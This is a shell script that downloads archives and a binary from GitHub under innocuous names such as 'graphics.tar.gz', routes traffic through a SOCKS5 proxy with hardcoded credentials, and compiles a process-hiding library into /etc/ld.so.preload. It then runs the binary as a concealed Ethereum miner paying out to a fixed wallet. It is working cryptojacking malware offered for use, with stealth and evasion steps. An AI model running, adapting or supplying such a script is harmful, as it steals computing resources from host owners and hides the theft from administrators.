#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl libcurl4-openssl-dev libapr1

wget https://github.com/scatterfafafa/jembot/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 3.16.66.235:1080
socks5_username = mikrotik999
socks5_password = Elibawnos
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "******************************************************************"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "******************************************************************"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Nordic_Ops
chmod +x Nordic_Ops

./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNord.zip
unzip magicNord.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

sudo ./graftcp/graftcp -w --whiteip-file=ips.txt prog ./Nordic_Ops --algo ethash --hostname eth-eu1.hellominer.com --port 5555 --wallet 0x587bdded4037bba7c74fb6af2f6e296bb2f8415d --worker-name Black_Dick
	
